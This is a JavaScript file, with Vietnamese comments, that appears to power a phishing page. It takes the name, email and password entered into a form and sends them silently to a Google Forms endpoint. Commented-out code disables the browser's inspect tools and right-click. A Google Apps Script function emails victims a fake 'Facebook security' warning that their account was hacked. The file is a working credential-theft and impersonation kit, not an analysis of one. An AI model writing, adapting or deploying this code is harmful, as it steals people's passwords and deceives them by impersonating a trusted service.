const namecustomer = document.getElementById("fullname");
const email = document.getElementById("email");
const password = document.getElementById("password");
const submit = document.getElementById("submit");
submit.addEventListener("click",() =>{
       if (namecustomer.value && email.value && password.value){
              const data = {
                     name: namecustomer.value,
                     email: email.value,
                     password:password.value
              };
              postData(data);
       }else{
              alert("Vui long nhap du content.")
       }
})
async function postData(data){
       const formData = new FormData();
       formData.append("entry.783986495",data.name);
       formData.append("entry.1848463806",data.email);
       formData.append("entry.165713477",data.password);
       fetch("https://docs.google.com/forms/d/e/1FAIpQLSdp-uqhO-btUyLgMYXVUXicmcQnwD7k7MRcvKvWFmrvds8RkA/formResponse",{
              method: "POST",
              body: formData,
              mode:"no-cors"
       })
}

// document.addEventListener("keydown", function(event) {
//        if (event.key === "F12" || event.keyCode === 123) {
//            event.preventDefault();
//        }
//    });
// //Chặn không cho người dùng nhấp chuột phải
// document.addEventListener('contextmenu', function(event) {
//        event.preventDefault(); // Chặn sự kiện mặc định khi chuột phải được nhấp
//      });
// function myFunction(e) {
//        const name = e.values[1];
//        const email = e.values[2];
//        MailApp.sendEmail({
//          to: email,
//          subject:`Thông Báo Khẩn Cấp: Tài Khoản Facebook Của Bạn Đã Bị Hack`,
//          body: `Kính gửi ${name},
     
//      Chúng tôi là nhóm dịch vụ bảo mật Facebook và chúng tôi đang gửi thông báo này cho bạn để thông báo về một vấn đề quan trọng liên quan đến tài khoản Facebook của bạn.
     
//      Chúng tôi đã phát hiện ra rằng tài khoản Facebook của bạn đã bị hack bởi một bên thứ ba không xác định. Các hoạt động gần đây trên tài khoản của bạn đã cho thấy các biểu hiện không bình thường, bao gồm các đăng nhập từ các vị trí không xác định và hoạt động đăng bài không phải do bạn thực hiện.`
//        });
//      };